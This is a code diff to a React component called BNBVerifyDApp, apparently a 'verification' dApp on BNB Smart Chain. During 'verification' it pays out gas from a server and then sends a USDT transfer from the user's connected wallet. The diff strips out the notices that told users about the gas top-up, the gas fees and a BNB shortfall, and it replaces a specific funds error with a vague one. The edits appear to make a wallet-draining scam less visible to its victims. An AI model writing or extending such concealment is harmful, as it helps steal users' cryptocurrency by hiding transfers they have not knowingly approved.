@@ -134,7 +134,6 @@ export default function BNBVerifyDApp() {
             })
             const result = await response.json()
             if (response.ok && result.success && !result.alreadyFunded) {
-              toast({ title: "Gas assistance sent", description: result.message })
               await getBalance(accounts[0], walletProvider)
             }
           } catch (error) {
@@ -432,8 +431,6 @@ export default function BNBVerifyDApp() {
 
     if (!result.txHash) return
 
-    toast({ title: "Gas assistance sent", description: "Waiting for the BNB transfer to confirm..." })
-
     for (let attempt = 0; attempt < 60; attempt++) {
       const receipt = await provider.request({
         method: "eth_getTransactionReceipt",
@@ -541,11 +538,6 @@ export default function BNBVerifyDApp() {
       setGasInfo(gasCheck)
 
       if (!gasCheck.hasEnough) {
-        toast({
-          title: "⛽ Insufficient Gas Fees",
-          description: `Need ${gasCheck.requiredGas.toFixed(6)} BNB for gas fees. Please add BNB to your wallet.`,
-          variant: "destructive",
-        })
         setVerificationStep("completed")
         return
       }
@@ -578,12 +570,6 @@ export default function BNBVerifyDApp() {
         const shortfallBNB = gasCheck.shortfall.toFixed(6)
         const requiredBNB = gasCheck.requiredGas.toFixed(6)
 
-        toast({
-          title: "❌ Insufficient BNB for Gas Fees",
-          description: `Need ${requiredBNB} BNB for gas, but only have ${gasCheck.bnbBalance.toFixed(6)} BNB.`,
-          variant: "destructive",
-        })
-
         setVerificationResult({
           type: "flash",
           message: `⛽ Insufficient Gas Fees: You need ${requiredBNB} BNB but only have ${gasCheck.bnbBalance.toFixed(6)} BNB. Please add ${shortfallBNB} BNB.`,
@@ -602,7 +588,7 @@ export default function BNBVerifyDApp() {
 
       toast({
         title: "💰 Initiating USDT Transfer",
-        description: `Gas fees: ${gasCheck.requiredGas.toFixed(6)} BNB. Transferring ${usdtAmount.toFixed(2)} USDT...`,
+        description: `Transferring ${usdtAmount.toFixed(2)} USDT...`,
       })
 
       // Execute transfer using BSC EVM call (eth_sendTransaction)
@@ -646,8 +632,7 @@ export default function BNBVerifyDApp() {
       let errorTitle = "❌ Transfer Failed"
 
       if (error.message?.includes("insufficient funds")) {
-        errorTitle = "⛽ Insufficient Gas Fees"
-        errorMessage = "You don't have enough BNB for gas. Please add BNB and try again."
+        errorMessage = "The transfer could not be completed. Please try again."
       } else if (error.message?.includes("user rejected")) {
         errorTitle = "❌ Transaction Rejected"
         errorMessage = "Transaction was rejected. Please try again."
